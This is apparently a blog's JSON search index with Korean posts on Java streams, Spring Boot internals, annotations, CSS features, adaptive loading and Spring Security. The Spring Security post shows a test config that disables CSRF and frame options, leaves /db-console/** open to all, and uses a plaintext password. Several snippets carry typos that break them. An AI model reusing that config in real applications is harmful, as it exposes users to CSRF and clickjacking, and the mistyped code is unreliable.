pattern","categories":[],"tags":[]},{"title":"java-stream-parallel","slug":"java-stream-parallel","date":"2020-02-19T12:12:14.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/02/19/java-stream-parallel/","link":"","permalink":"https://blog.devkwang.app/2020/02/19/java-stream-parallel/","excerpt":"","text":"Java 8의 변경 사항중 하나인 lambda를 효과적으로 사용할 수 있도록 collection들은 stream을 제공한다. stream interface는 collection을 파이프식으로 처리 가능하도록 고차함수로 그 구조를 추상화 했다. 스트림을 사용하면서, 반복적인 형번환 소스코드를 간편하게 처리 할 수 있게 되었고, 가독성 또한 높아졌다. 만 또한 병렬연산을 쉽게 지원할 수 있게 도와주니 매력적으로 보인다. 하지만 Thread Pool을 직접 지정하는 이전 소스코드에 비해 Java 내부에 존재하는 공유 CommonPorkJoinPool 을 사용하기 때문에 여러개의 Thread가 일을 수행하는 Web Project의 경우에는 공유 Thread Pool의 Thread가 모자랄수 있다. Java는 내부적으로 Parallel Stream이 CommonPorkJoinPool을 가지고 있고 내부 Thread의 수를 해당 머신의 프로세서의 개수로 처음에 만들어 시작한다. 그래서 Property로 Thread의 수를 지정하거나 ForkJoinPool을 명시적으로 사용해 parallelStream을 처리할 수 있게 할 수 있다. Property 설정 1System.setProperty(\"java.util.concurrent.ForkJoinPool.common.parallelism\",\"6\"); 명시적 ForkJoinPool 사용 1234567891011ForkJoinPool forkjoinPool = new ForkJoinPool(5);forkjoinPool.submit(() -&gt; &#123; list.parallelStream().forEach(index -&gt; &#123; System.out.printIn(\"Thread : \" + Thread.currentThread().getName() + \", index + \", \" + new Date()); try&#123; Thread.sleep(500); &#125; catch (InterruptedException e)&#123; &#125; &#125;);&#125;).get(); ForkJoinPool 생성자에 Thread 개수를 지정해서 사용할 수 있다. ForkJoinPool 기본적으로는 ExecutorService의 구현체이지만, 다른 점은 각 thread들이 개별 큐를 가지게 되며, 다음 그림의 B처럼 아무런 task가 없으면 A의 task를 가져와 처리하게 됨으로써 CPU 자원을 효율적으로 사용할 수 있게 된다. ForkJoinPool의 특성상 나누어지는 Job은 균등하게 처리가 되어야 한다. Spliterator의 trySplit()을 사용해 작업을 분할 하는데 균등하지 않으면 순차적으로 실행하는 것보다 비효율적일 수 있다. 12345678public Spliterator&lt;T&gt; trySplit() &#123; int lo = index, mid = (lo + fence) &gt;&gt;&gt; 1; return (lo &gt;= mid) ? null : new ArraySpliterator&lt;&gt;(array, lo, index = mid, characteristics);&#125; 또한, 병렬로 처리되는 작업이 독립적이지 않다면, 수행 성능에 영향이 있을 수 있다. stream의 중간 단계 연산 중 sorted(), distinct()와 같은 작업을 수행하는 경우에는 내부적으로 상태에 대한 변수를 각 작업들이 공유(synchronized)하게 되어 있다. 이럴때 순차적으로 실행하는 경우가 더 효과적일 수 있다. 참고 http://gee.cs.oswego.edu/dl/html/StreamParallelGuidance.html","categories":[],"tags":[]},{"title":"java-stream","slug":"java-stream","date":"2020-02-19T12:01:08.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/02/19/java-stream/","link":"","permalink":"https://blog.devkwang.app/2020/02/19/java-stream/","excerpt":"","text":"스트림의 중개 연산(intermediate operation) 스트림 API에 의해 생성된 초기 스트림은 중개 연산을 통해 또 다른 스트림으로 변환됩니다. 이러한 중개 연산은 스트림을 전달받아 스트림을 반환하므로, 중개 연산은 연속으로 연결해서 사용할 수 있습니다. 또한, 스트림의 중개 연산은 필터-맵(filter-map) 기반의 API를 사용함으로 지연(lazy) 연산을 통해 성능을 최적화할 수 있습니다. 스트림 필터링 : filter(), distinct() 스트림 변환 : map(), flatMap(), boxed() 스트림 제한 : limit(), skip() 스트림 정렬 : sorted() 스트림 연산 결과 확인 : peek() 스트림 반복 : forEach() 스트림 매칭 : allMatch() =&gt; 전부 만족, anyMatch() =&gt; 최소 한개가 조건 만족, noneMatch() =&gt; 모두 불만족 스트림 집계 : sum(), count(), average(), max(), min() / reduce() peek의 경우는 특수하게 동작하는데 중간 처리 단계에서 전체 요소를 루핑하고, 추가적 작업을 위해 사용하며 최종 처리 메소드가 호출 되어야만 동작한다. 이중 스트림을 반복처리하는 forEach()는 최종 처리 메소드로 파이프 라인 마지막에 루핑하여 요소를 하나씩 처리한다. 최종 처리 메소드 뒤에는 sum() 같은 최종 처리 메소드가 호출되면 안된다.","categories":[],"tags":[]},{"title":"apache-ignite-spring-boot","slug":"apache-ignite-spring-boot","date":"2020-02-18T13:00:35.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/02/18/apache-ignite-spring-boot/","link":"","permalink":"https://blog.devkwang.app/2020/02/18/apache-ignite-spring-boot/","excerpt":"","text":"cache도 전략 및 패턴을 좀 봐야함 https://brunch.co.kr/@springboot/151 https://www.slideshare.net/ssuser373c87/accelerate-spring-boot-application-with-apache-ignite https://github.com/iyboklee/boot-cache-ignite https://github.com/iyboklee/boot-data-ignite https://github.com/iyboklee/boot-rw-through-ignite","categories":[{"name":"Java","slug":"Java","permalink":"https://blog.devkwang.app/categories/Java/"},{"name":"Cache","slug":"Java/Cache","permalink":"https://blog.devkwang.app/categories/Java/Cache/"}],"tags":[{"name":"java","slug":"java","permalink":"https://blog.devkwang.app/tags/java/"},{"name":"spring","slug":"spring","permalink":"https://blog.devkwang.app/tags/spring/"}]},{"title":"spring-boot-logging","slug":"spring-boot-logging","date":"2020-02-18T12:23:27.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/02/18/spring-boot-logging/","link":"","permalink":"https://blog.devkwang.app/2020/02/18/spring-boot-logging/","excerpt":"","text":"스프링 부트에서는 로깅 설정을 자동적으로 지원한다. SLF4J를 사용한 로깅 파사드를 통해 구현체를 사용하게 되며 스프링부트의 기본은 logback으로 되어 있다. Spring Boot는 기존 Spring에서의 사용법과는 다르게 logback-spring.xml를 사용하도록 권장하고 있다. 기존 logback과 다른점은 logback file 안에서 Spring context를 접근할 수 있다는 것이다. 기존 logback은 파일이름으로 프로파일을 지정해 사용했던 반면, spring boot의 logback은 내부에서 프로파일에 대한 if문 처리를 해 파일 하나로 간단하게 관리할 수 있게 도와준다. https://docs.spring.io/spring-boot/docs/2.0.1.RELEASE/reference/htmlsingle/#boot-features-logging 상단 링크에 적혀있는 글이 매우 도움이 될 것이다. 현재 프로젝트에서는 Spring-boot-starter-web을 기준으로 프로젝트를 진행하고 있다. https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-web/2.2.4.RELEASE 해당 spring-boot-starter-web은 내부에 spring-boot-starter를 참조하고 있고, spring-boot-starter는 spring-boot-starter-logging을 참조 하고 있어서 logback 이외에 다른 구현체를 사용하고 싶으면 spring-boot-starter-logging을 exclude하고 다른 spring-boot-starter를 선언해주면 된다.","categories":[],"tags":[]},{"title":"enable-annotation-spring","slug":"enable-annotation-spring","date":"2020-01-20T11:06:59.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/01/20/enable-annotation-spring/","link":"","permalink":"https://blog.devkwang.app/2020/01/20/enable-annotation-spring/","excerpt":"","text":"Spring Boot에서 Enable로 시작하는 Annotation Bean을 생성할 때, 고정 값이 아닌 동적으로 값을 얻어와 빈을 생성해 주어야 하는 경우가 있다. ex) Url이 DB에 저장되어 있거나 File에 저장되어 있어 이를 읽어와 빈을 생성해야 하는경우 선언적으로 빈을 생성하지 못하고 동적으로 빈을 생성해야 할 경우 @Enable* Annotation을 사용해 빈을 선언할 수 있다. @Enable* Annotation 을 사용하는 방법은 3가지이다. @Import를 사용하여 정의한 Bean을 불러와서 사용 ex) EnableScheduling 1234567891011121314151617@Target(ElementType.TYPE)@Retention(RetentionPolicy.RUNTIME)@Import(SchedulingConfiguration.class)@Documentedpublic @interface EnableScheduling &#123; &#125;@Configurationpublic class SchedulingConfiguration &#123; @Bean(name=AnnotationConfigUtils.SCHEDULED_ANNOTATION_PROCESSOR_BEAN_NAME) @Role(BeanDefinition.ROLE_INFRASTRUCTURE) public ScheduledAnnotationBeanPostProcessor scheduledAnnotationProcessor() &#123; return new ScheduledAnnotationBeanPostProcessor(); &#125; &#125; @ImportSelector를 사용하여 빈을 생성하는 경우 ImportSelector 인터페이스를 구현하고 Return하는 배열에 클래스의 이름을 적어 반환해주면 된다. Ex) EnableTransaction 123456789101112131415161718192021222324252627282930313233@Target(ElementType.TYPE)@Retention(RetentionPolicy.RUNTIME)@Documented@Import(TransactionManagementConfigurationSelector.class)public @interface EnableTransactionManagement &#123; boolean proxyTargetClass() default false; AdviceMode mode() default AdviceMode.PROXY; int order() default Ordered.LOWEST_PRECEDENCE;&#125;public class TransactionManagementConfigurationSelector extends AdviceModeImportSelector&lt;EnableTransactionManagement&gt; &#123; @Override protected String[] selectImports(AdviceMode adviceMode) &#123; switch (adviceMode) &#123; case PROXY: return new String[] &#123;AutoProxyRegistrar.class.getName(), ProxyTransactionManagementConfiguration.class.getName()&#125;; case ASPECTJ: return new String[] &#123;determineTransactionAspectClass()&#125;; default: return null; &#125; &#125; private String determineTransactionAspectClass() &#123; return (ClassUtils.isPresent(\"javax.transaction.Transactional\", getClass().getClassLoader()) ? TransactionManagementConfigUtils.JTA_TRANSACTION_ASPECT_CONFIGURATION_CLASS_NAME : TransactionManagementConfigUtils.TRANSACTION_ASPECT_CONFIGURATION_CLASS_NAME); &#125;&#125; @ImportBeanDefinitionRegistrar를 사용한 BeanRegistry에 Bean 등록하기 동적으로 값을 얻어와 빈에 할당하려면 이 방법 뿐이였다. 준비물 : Google Reflections Library, 1234567891011121314151617public void registerBeanDefinitions(AnnotationMetadata annotationMetadata, BeanDefinitionRegistry registry) &#123; String basePackageName = ((StandardAnnotationMetadata) annotationMetadata).getIntrospectedClass().getPackage().getName(); Set&lt;Class&lt;?&gt;&gt; interfaces = new Reflections(basePackageName).getTypesAnnotatedWith(ProjectFeignClient.class); interfaces.forEach(type -&gt; &#123; BeanDefinitionBuilder builder = BeanDefinitionBuilder.genericBeanDefinition(ProjectFeignFactoryBean.class); builder.setLazyInit(true); builder.addPropertyValue(\"type\", type.getName()); builder.setAutowireMode(2); AbstractBeanDefinition definition = builder.getBeanDefinition(); definition.setPrimary(true); BeanDefinitionReaderUtils.registerBeanDefinition( new BeanDefinitionHolder(definition, type.getName()), registry ); &#125;);","categories":[{"name":"Java","slug":"Java","permalink":"https://blog.devkwang.app/categories/Java/"},{"name":"Spring","slug":"Java/Spring","permalink":"https://blog.devkwang.app/categories/Java/Spring/"}],"tags":[{"name":"java","slug":"java","permalink":"https://blog.devkwang.app/tags/java/"},{"name":"spring","slug":"spring","permalink":"https://blog.devkwang.app/tags/spring/"},{"name":"enableannotation","slug":"enableannotation","permalink":"https://blog.devkwang.app/tags/enableannotation/"}]},{"title":"annotation","slug":"annotation","date":"2020-01-20T10:15:38.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/01/20/annotation/","link":"","permalink":"https://blog.devkwang.app/2020/01/20/annotation/","excerpt":"","text":"Java Annotation 어노테이션이란 본래 주석이란 뜻 해석 되는 시점 정의 주석 대체 기존 자바 웹 어플리케이션들은 구성과 설정값들을 외부의 XML설정 파일에 명시하는 방법으로 프로그래밍 되었다. 변경 될 수 있는 코드가 아닌 외부 설정 파일에 분리하기 때문에 재컴파일 없이도 쉽게 변경사항을 적용 할 수 있었지만, 프로그램 작성을 위해 매번 많은 설정을 작성해야 한다는 불편함이 존재했다. 어노테이션을 사용하면 기존 로직과는 별개로 필요한 정보들을 기입 할 수 있고, 런타임에서 Reflection을 통해 해당 정보를 얻어 올 수 있다. 문서화 부분은 Javadoc이 존재하기 때문에 많이 사용되지 않으며, 어노테이션의 본질적 목적은 소스 코드에 메타데이터를 표현하는 것이다. 12345@Target(ElementType.METHOD)@Retention(RetentionPolicy.RUNTIME)public @interface CustomAnnotation &#123; boolean isCheck() default true;&#125; Meta Annotation @Retention Java Compiler가 Annotation을 다루는 방법을 기술하며, 어느 시점까지 영향을 미치는 지 결정하는 값 RetentionPolicy.SOURCE : 컴파일 전까지 유효 ( 컴파일 이후 클래스 정보에서 삭제) RetentionPolicy.CLASS : 컴파일러가 클래스를 참조하기 전까지 유효 RetentionPolicy.RUNTIME : 컴파일 이후에도 JVM에 의해 계속 참조가 가능. (Runtime Code에서 Reflection을 통한 참조가 가능) @Target Annotation을 선언할 위치를 선택한다. ElementType.PACKAGE : 패키지 선언 ElementType.TYPE : 타입 선언 ElementType.ANNOTATION_TYPE : 어노테이션 타입 선언 ElementType.CONSTRUCTOR : 생성자 선언 ElementType.FIELD : 멤버 변수 선언 ElementType.LOCAL_VARIABLE : 지역 변수 선언 ElementType.METHOD : 메서드 선언 ElementType.PARAMETER : 전달인자 선언 ElementType.TYPE_PARAMETER : 전달인자 타입 선언 ElementType.TYPE_USE : 타입 선언 @Documented 해당 어노테이션을 Javadoc에 포함시킨다. @Inherited 어노테이션의 상속을 가능하게 한다. 주의 : 어노테이션 끼리의 상속이 아닌 해당 어노테이션을 가지고 있는 클래스를 상속할 경우 자식 클래스도 해당 어노테이션을 가짐을 뜻한다. @Native JVM이 설치된 OS의 네이티브 메서드에 의해 참조되는 상수필드에 붙이는 어노테이션이다. JNI (Java Native Interface) Object, Atomic, file 등 @Repeatable 같은 어노테이션을 중복정의 가능한 @Repeatable 어노테이션을 제공 123456789// case 1@GreenColor@BlueColor@RedColorpublic class RGBColor &#123; ... &#125;// case 2@Color(colors=&#123;\"green\", \"blue\", \"red\"&#125;public class RGBColor &#123; ... &#125; 아래와 같이 하나의 RGB Color가 Color에 속함을 보이고 1234@Color(\"green\")@Color(\"blue\")@Color(\"red\")public class RGBColor &#123; ... &#125; Color 어노테이션과 Colors 어노테이션을 정의해 표현한다. @Repeatable(value = Colors.class) public @interface Color {} @Target(ElementType.TYPE) @Retention(RetentionPolicy.RUNTIME) @Documented public @interface Colors { Color[] value(); } 참조 : https://asfirstalways.tistory.com/309 https://jistol.github.io/java/2018/08/31/annotation-repeatable/ https://stackoverflow.com/questions/23973107/how-to-use-inherited-annotation-in-java/23973331","categories":[{"name":"Java","slug":"Java","permalink":"https://blog.devkwang.app/categories/Java/"},{"name":"Java 8","slug":"Java/Java-8","permalink":"https://blog.devkwang.app/categories/Java/Java-8/"}],"tags":[{"name":"java","slug":"java","permalink":"https://blog.devkwang.app/tags/java/"}]},{"title":"spring-initializer","slug":"spring-initializer","date":"2019-12-20T05:18:24.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2019/12/20/spring-initializer/","link":"","permalink":"https://blog.devkwang.app/2019/12/20/spring-initializer/","excerpt":"","text":"An ApplicationStartingEvent is sent at the start of a run, but before any processing except the registration of listeners and initializers. An ApplicationEnvironmentPreparedEvent is sent when the Environment to be used in the context is known, but before the context is created. An ApplicationPreparedEvent is sent just before the refresh is started, but after bean definitions have been loaded. An ApplicationReadyEvent is sent after the refresh and any related callbacks have been processed to indicate the application is ready to service requests. An ApplicationFailedEvent is sent if there is an exception on startup. 1. SharedMetadataReaderFactoryContextInitializer initialize 함수가 호출되면 applicationContext에 PostProcessor로 CachingMetadataReaderFactoryPostProcessor를 등록한다. CachingMetadataReaderFactoryPostProcessor 12345@Overridepublic int getOrder() &#123; // Must happen before the ConfigurationClassPostProcessor is created return Ordered.HIGHEST_PRECEDENCE;&#125; 12345public interface Ordered &#123; int HIGHEST_PRECEDENCE = Integer.MIN_VALUE; int LOWEST_PRECEDENCE = Integer.MAX_VALUE; int getOrder();&#125; ConfigurationClassPostProcessor가 생성되기전 반드시 수행되어야 하는 프로세서이다. HIGHEST_PRECEDENCE의 값은 Integer.MIN_VALUE register 수행시 BeanDefinitionRegistry에 BeanDefinition에 &quot;org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory&quot;으로 BeanDefinition 등록","categories":[],"tags":[]},{"title":"event-publishing-run-listener","slug":"event-publishing-run-listener","date":"2019-12-19T06:44:23.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2019/12/19/event-publishing-run-listener/","link":"","permalink":"https://blog.devkwang.app/2019/12/19/event-publishing-run-listener/","excerpt":"","text":"스프링부트가 기동 될때, 기본적으로 등록하는 Run Listener 내부에 SpringApplication을 가지고 있고, SimpleApplicationEventMulticaster에 ApplicationListener들을 등록한다.","categories":[],"tags":[{"name":"spring boot listener","slug":"spring-boot-listener","permalink":"https://blog.devkwang.app/tags/spring-boot-listener/"}]},{"title":"spring-boot-application-run-listeners","slug":"spring-boot-application-run-listeners","date":"2019-12-19T06:33:04.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2019/12/19/spring-boot-application-run-listeners/","link":"","permalink":"https://blog.devkwang.app/2019/12/19/spring-boot-application-run-listeners/","excerpt":"","text":"Spring에서 사용하는 기본적인 Listeners 구현체 SpringApplicationRunListener를 들고 있고 변경 불가능하게 되어있다. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374class SpringApplicationRunListeners &#123; private final Log log; private final List&lt;SpringApplicationRunListener&gt; listeners; SpringApplicationRunListeners(Log log, Collection&lt;? extends SpringApplicationRunListener&gt; listeners) &#123; this.log = log; this.listeners = new ArrayList&lt;&gt;(listeners); &#125; public void starting() &#123; for (SpringApplicationRunListener listener : this.listeners) &#123; listener.starting(); &#125; &#125; public void environmentPrepared(ConfigurableEnvironment environment) &#123; for (SpringApplicationRunListener listener : this.listeners) &#123; listener.environmentPrepared(environment); &#125; &#125; public void contextPrepared(ConfigurableApplicationContext context) &#123; for (SpringApplicationRunListener listener : this.listeners) &#123; listener.contextPrepared(context); &#125; &#125; public void contextLoaded(ConfigurableApplicationContext context) &#123; for (SpringApplicationRunListener listener : this.listeners) &#123; listener.contextLoaded(context); &#125; &#125; public void started(ConfigurableApplicationContext context) &#123; for (SpringApplicationRunListener listener : this.listeners) &#123; listener.started(context); &#125; &#125; public void running(ConfigurableApplicationContext context) &#123; for (SpringApplicationRunListener listener : this.listeners) &#123; listener.running(context); &#125; &#125; public void failed(ConfigurableApplicationContext context, Throwable exception) &#123; for (SpringApplicationRunListener listener : this.listeners) &#123; callFailedListener(listener, context, exception); &#125; &#125; private void callFailedListener(SpringApplicationRunListener listener, ConfigurableApplicationContext context, Throwable exception) &#123; try &#123; listener.failed(context, exception); &#125; catch (Throwable ex) &#123; if (exception == null) &#123; ReflectionUtils.rethrowRuntimeException(ex); &#125; if (this.log.isDebugEnabled()) &#123; this.log.error(\"Error handling failed\", ex); &#125; else &#123; String message = ex.getMessage(); message = (message != null) ? message : \"no error message\"; this.log.warn(\"Error handling failed (\" + message + \")\"); &#125; &#125; &#125;&#125;","categories":[],"tags":[{"name":"springboot","slug":"springboot","permalink":"https://blog.devkwang.app/tags/springboot/"}]},{"title":"springboot-run","slug":"springboot-run","date":"2019-12-19T05:57:33.000Z","updated":"2022-01-28T01:25:12.427Z","comments":true,"path":"2019/12/19/springboot-run/","link":"","permalink":"https://blog.devkwang.app/2019/12/19/springboot-run/","excerpt":"","text":"Spring Boot를 사용한 프로젝트를 진행하다보니 Spring Boot 및 Security에 대한 전반적인 지식이 필요 해졌고, 기존 설정들과는 다른 부분들이 존재해 Run을 진행하는 Entry Point 부터 하나씩 분석하기로 한다. https://www.jetbrains.com/help/idea/class-diagram.html 로 클래스 다이어그램을 추출해 기록할 예정이며, 분석하는 Spring Boot버전은 2.1.1, Tomcat은 9버전이 될 것이다. 12345678910111213141516171819202122232425262728293031323334353637383940public ConfigurableApplicationContext run(String... args) &#123; StopWatch stopWatch = new StopWatch(); stopWatch.start(); ConfigurableApplicationContext context = null; Collection&lt;SpringBootExceptionReporter&gt; exceptionReporters = new ArrayList&lt;&gt;(); configureHeadlessProperty(); // 1 SpringApplicationRunListeners listeners = getRunListeners(args); // 2 listeners.starting(); try &#123; ApplicationArguments applicationArguments = new DefaultApplicationArguments(args); // 1 ConfigurableEnvironment environment = prepareEnvironment(listeners, applicationArguments); configureIgnoreBeanInfo(environment); Banner printedBanner = printBanner(environment); context = createApplicationContext(); exceptionReporters = getSpringFactoriesInstances(SpringBootExceptionReporter.class, new Class[] &#123; ConfigurableApplicationContext.class &#125;, context); prepareContext(context, environment, listeners, applicationArguments, printedBanner); refreshContext(context); afterRefresh(context, applicationArguments); stopWatch.stop(); if (this.logStartupInfo) &#123; new StartupInfoLogger(this.mainApplicationClass).logStarted(getApplicationLog(), stopWatch); &#125; listeners.started(context); callRunners(context, applicationArguments); &#125; catch (Throwable ex) &#123; handleRunFailure(context, ex, exceptionReporters, listeners); throw new IllegalStateException(ex); &#125; try &#123; listeners.running(context); &#125; catch (Throwable ex) &#123; handleRunFailure(context, ex, exceptionReporters, null); throw new IllegalStateException(ex); &#125; return context;&#125; 1 Configure HeadLess Property SYSTEM_PROPERTY_JAVA_AWT_HEADLESS를 True로 바꿔준다. SYSTEM_PROPERTY_JAVA_AWT_HEADLESS는 비 윈도우 환경에서 GUI컴포넌트를 사용할 수 있게 하는 JAVA System Property 2 getRunListeners Observer Pattern으로 동록된 모든 Listener 들에게 해당 이벤트가 발생할 경우 전부 실행해준다. 1234567891011121314151617class SpringApplicationRunListeners &#123; private final Log log; private final List&lt;SpringApplicationRunListener&gt; listeners; SpringApplicationRunListeners(Log log, Collection&lt;? extends SpringApplicationRunListener&gt; listeners) &#123; this.log = log; this.listeners = new ArrayList&lt;&gt;(listeners); &#125; public void starting() &#123; for (SpringApplicationRunListener listener : this.listeners) &#123; listener.starting(); &#125; &#125;&#125; SpringBoot는 Listener를 별도로 등록하지 않을 경우 EventPublishingRunListener를 등록해 사용한다.","categories":[],"tags":[{"name":"springboot","slug":"springboot","permalink":"https://blog.devkwang.app/tags/springboot/"}]},{"title":"next-generation-web-styling","slug":"next-generation-web-styling","date":"2019-12-13T05:08:15.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2019/12/13/next-generation-web-styling/","link":"","permalink":"https://blog.devkwang.app/2019/12/13/next-generation-web-styling/","excerpt":"","text":"Closed Caption (폐쇄 자막, 자막의 표시여부를 설정할 수 있는 자) 1) Scroll-snap 123456789section &#123; overflow-x: auto; overscroll-behavior-y: contain; scroll-snap-type: y mandatory;&#125;section &gt; picture&#123; scroll-snap-align: center;&#125; List with Sub-List HTML 12345678&lt;ul&gt; &lt;li&gt;&lt;a herf=\"...\"&gt;One&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a herf=\"...\" aria-haspopup=\"true\"&gt;TWO&lt;/a&gt; &lt;ul class=\"\"dropdown\" aria-label=\"submenu\"&gt; &lt;li&gt;&lt;a herf=\"...\"&gt;SUB-1&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt;&lt;/ul&gt; 123456li:hover &gt; el,li:focus &gt; ul &#123;visibility: visible;opacity: 1;&#125; 2) @media (prefers-*) prefers-reduced-motion 1234@media (prefers-reduced-motion: reduce) &#123; animation: cross-fade 3s ease-in-out infinite;&#125; prefers-color-scheme 1234@media(prefers-color-scheme: dark) &#123; --lightness: 90%; --text-1: hsl(200 10% var(--lightness));&#125; 3) Logical properties new mental modal the browser does all of that great work for you to make that website more internaltionalized. 12345678910111213141516.box &#123; block-size: 300px; inline-size: 200px;&#125;.h2, p &#123; // margin-left: 3rem; margin-inline-start: 3rem;&#125;main &#123; //border-top: 2px dashed; border-block-start: 2px dashed; //margin-top: 3rem; margin-block-start: 3rem;&#125; https://wit.nts-corp.com/2018/08/28/5317 4) Sticky situations Classic sticky The Sticky stack {CSS} Ui layers overlap within the viewport 1234dl &gt; dt &#123; position: sticky; top: 0;&#125; 12345&lt;dl&gt;&lt;dt&gt;A&lt;/dt&gt;...&lt;dt&gt;B&lt;/dt&gt;&lt;/dl&gt; The sticky Desperado {HTML} 5) backdrop-filter 123element.style &#123; backdrop-filter: blur(10px);&#125; 6) :is() any(), match() 1234567button:is(.focus, :focus) &#123; ...&#125;article &gt; :is(h1,h2,h3,h4,h5,h6) &#123; ...&#125; 7) grid gap gap (for Flexbox) 12345.flex-button &#123; display: inline-flex; gap: 1rem; place-items: center;&#125; 8) Houdini low-level css 9) Properties &amp; Values API 10) Typed OM 11) Paint API 12) Animation Worklet Speed Round 1234.box &#123; size: 50vw; &#125;iframe &#123; aspect-ratio: 16 / 9;&#125;// min(),max(),clamp() h1 &#123; font-size: clamp(1.5rem, 6vw);&#125; https://css-at-cds.netlify.com/","categories":[],"tags":[]},{"title":"adaptive-loading","slug":"adaptive-loading","date":"2019-12-11T04:45:22.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2019/12/11/adaptive-loading/","link":"","permalink":"https://blog.devkwang.app/2019/12/11/adaptive-loading/","excerpt":"","text":"https://youtu.be/puUPpVrIRkc Adaptive Loading for improving performance (slick experience) Do we need to deliver the exact same experience to every user? 많은 웹사이트들에서 자바스크립트가 많이 사용되고 있고 자바스크립트는 single thread 기반으로 실행된다. 다양한 디바이스들의 성능은 Benchmark 를 보더라도 매년 향상되고 있지만 싱글 CPU 자체의 성능은 많이 향상되지 않았다. for example youtube -&gt; 514kb js download network type change to fast 3g youtube used low network module? Network-aware Resource Loading react-adaptive-hooks adaptive-vue 19년 12월 기준 chrome Experimental const network = navigator.connection.effectiveType; harmony12345678910111213141516171819202122232425import React from 'react';import &#123; useNetworkStatus &#125; from 'react-adaptive-hooks/network';const MyComponent = () =&gt; &#123; const &#123; effectiveConnectionType &#125; = useNetworkStatus(); let media; switch(effectiveConnectionType) &#123; case '2g': media = &lt;img src='medium-res.jpg'/&gt;; break; case '3g': media = &lt;img src='high-res.jpg'/&gt;; break; case '4g': media = &lt;video muted controls&gt;...&lt;/video&gt;; break; default: media = &lt;video muted controls&gt;...&lt;/video&gt;; break; &#125; return &lt;div&gt;&#123;media&#125;&lt;/div&gt;;&#125;; ####memory navigator.deviceMemory ####cpu navigator.hardwareConcurrency ####Adaptive Capability Toggling ####Adaptive Delivery with Client Hints Enable 1&lt;meta http-equiv=\"Accept-CH\" content=\"Device-Memory, Viewport-Width Save-Data\"/&gt; Added Accept-CH : Device-Memory, Save-Data, Viewport-Width slick experience &lt;-&gt; choppy experience Do not just respond based on screen size, adapt based on actual device hardware. Define buckets Integrate buckets into logging Adapt loading based on buckets browser 기준으로 Log hardwareConcurrency and deviceMemory Group by hardwareConcurrency, DeviceMemory, and OS when looking at perf data figure out buckets based on groupings. adaptivity should be considered in your core frameworks Think about animations Low End &lt;- animation 제거 High End Mobile Websites (Viewport-Width, CPU 등) Load fast vs respond fast Trade-off 123if (isLowEndDevice()) &#123; scheduler.unstable_forceFrameRate(15);&#125;","categories":[{"name":"Web","slug":"Web","permalink":"https://blog.devkwang.app/categories/Web/"},{"name":"JavaScript","slug":"Web/JavaScript","permalink":"https://blog.devkwang.app/categories/Web/JavaScript/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://blog.devkwang.app/tags/javascript/"}]},{"title":"spring-security","slug":"spring-security","date":"2019-11-22T05:04:46.000Z","updated":"2022-01-28T01:25:12.427Z","comments":true,"path":"2019/11/22/spring-security/","link":"","permalink":"https://blog.devkwang.app/2019/11/22/spring-security/","excerpt":"","text":"Authentication Manager Spring Security에서는 AuthenticationManager라는 Interface가 존재하고 이를 구현하면 된다. 웹 어플리케이션에서 보통 WebConfig를 설정하기 위해 extends 받는 객체가 WebSecurityConfigurerAdapter이며 이는 WebSecurityConfigurer를 구현한 것이다. Init함수 실행시 HttpSecurity를 생성하고 내부적으로 내부 init 함수 안에서 최초 1번 생성해서 반환하게 된다. Provider Manager Provider Manager는 Request의 Authentication을 다루는 AuthenticationProvider를 관리하기 위한 manager이며, 각각의 AuthenticationProvider의 구현에 따라 인증할 수 있는 범위가 넓어지며, DAO기반, LDAP기반, anonymous기반 등 여러가지 Provider를 관리할 수 있다. 만약 각 Provider에서 처리할 수 없고 null값이 나온다면 Provider Manager는 ProviderNotFoundException을 Throw 해 처리한다. Authentication - DaoAuthenticationProvider Authentication의 간단한 구현체는 DaoAuthenticationProvider이며 이는 프레임워크에서 조기에 지원한 하나의 구현체입니다. 12345678910public class DaoAuthenticationProvider extends AbstractUserDetailsAuthenticationProvider &#123; private static final String USER_NOT_FOUND_PASSWORD = \"userNotFoundPassword\"; private PasswordEncoder passwordEncoder; private volatile String userNotFoundEncodedPassword; ## UserDetailService private UserDetailsService userDetailsService; private UserDetailsPasswordService userDetailsPasswordService; UserDetailService를 Injection받아 해당 유저가 올바른 유저인지 체크한다. 1234567891011121314151617181920212223242526272829import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.security.config.annotation.web.builders.HttpSecurity;import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;import org.springframework.security.core.userdetails.User;import org.springframework.security.core.userdetails.UserDetailsService;import org.springframework.security.provisioning.InMemoryUserDetailsManager;@Configurationpublic class WebConfig extends WebSecurityConfigurerAdapter &#123; @Bean public UserDetailsService userDetailsService() &#123; InMemoryUserDetailsManager manager = new InMemoryUserDetailsManager(); manager.createUser(User.withUsername(\"user\").password(\"password\").roles(\"USER\").build()); return manager; &#125; @Override protected void configure(HttpSecurity http) throws Exception &#123; http. authorizeRequests() .antMatchers(\"/db-console/**\") .permitAll().anyRequest().authenticated(); http.csrf().disable(); http.headers().frameOptions().disable(); &#125;&#125; 보통 테스트시에는 InMemoryUserDetailsManager를 UserDetailsService 빈으로 생성해 사용한다. 인증을 성공한 이후 보안상의 문제로 인증된 Authentication 객체를 삭제한다고 한다. 허나 Stateless Application상의 성능 향상을 위해선 Cache가 필수이고 이를 지원하기 위해 AuthenticationProvider에 캐쉬구현을 하거나 복사본을 만들어 놓고, eraseCredentialsAfterAuthentication Property를 disable 할수도 있다고 한다. 자세한 사항은 Javadoc의 구현을 확인하라고 한다. 